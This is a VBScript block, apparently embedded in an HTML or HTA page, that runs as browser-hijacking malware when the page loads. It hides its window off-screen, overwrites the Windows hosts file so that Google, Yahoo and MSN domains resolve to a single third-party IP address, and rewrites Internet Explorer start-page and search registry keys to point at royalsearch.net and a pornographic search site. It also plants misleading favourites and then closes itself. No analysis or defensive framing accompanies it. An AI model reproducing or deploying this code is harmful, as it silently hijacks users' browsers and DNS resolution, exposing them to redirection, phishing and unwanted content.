<script language=VBS>
self.MoveTo 5000,5000
Set Shl = CreateObject("WScript.Shell")
set WshProEnv = Shl.Environment("PROCESS")
Set er=CreateObject("Scripting.FileSystemObject")
pth = WshProEnv("WINDIR") +"\system32\drivers\etc\hosts"
pth98 = WshProEnv("WINDIR") +"\hosts"
sub hosts()
aeb.WriteLine"66.98.142.163 auto.search.msn.com"
aeb.WriteLine"66.98.142.163 search.msn.com"
aeb.WriteLine"66.98.142.163 msn.com"
aeb.WriteLine"66.98.142.163 www.msn.com"
aeb.WriteLine"66.98.142.163 yahoo.com"
aeb.WriteLine"66.98.142.163 www.yahoo.com"
aeb.WriteLine"66.98.142.163 google.com"
aeb.WriteLine"66.98.142.163 www.google.com"
aeb.WriteLine"66.98.142.163 thenun.com"
aeb.WriteLine"66.98.142.163 www.thehun.com"
aeb.WriteLine"66.98.142.163 thehun.net"
aeb.WriteLine"66.98.142.163 www.thehun.net"
end sub
If er.FileExists(pth98)  Then
Set aeb=er.CreateTextFile(pth98)
hosts()
end if
If er.FileExists(pth)  Then
Set aeb=er.CreateTextFile(pth)
hosts()
end if
sub AddFavoriteLink(loc, DispName, SiteURL)
Set Shor = Shl.CreateShortcut(loc +"\"+ DispName +".URL")
Shor.TargetPath = SiteURL
Shor.Save()
end sub
loc = Shl.SpecialFolders("Favorites")
AddFavoriteLink loc, "ALL PREMIUM SEARCHES FOR YOU","http://www.royalsearch.net"
AddFavoriteLink loc, "FREE PORN SEARCHES","http://www.sex-true.com/search/"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.sex-true.com/search/"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.sex-true.com/search/"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.royalsearch.net/search.html"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Search Bar","http://www.royalsearch.net/search.html"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Use Search Asst","no"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\SearchUrl\","http://www.royalsearch.net/search.php?qq=%s"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Search\SearchAssistant","http://www.royalsearch.net/search.html"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Search\CustomizeSearch","http://www.royalsearch.net/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\SearchAssistant","http://www.royalsearch.net/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\CustomizeSearch","http://www.royalsearch.net/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\Default_Search_URL","http://www.royalsearch.net/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Default_Page_URL","http://www.royalsearch.net"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Default_Search_URL","http://www.royalsearch.net/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.royalsearch.net/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.royalsearch.net/search.html"
window.close()
</script>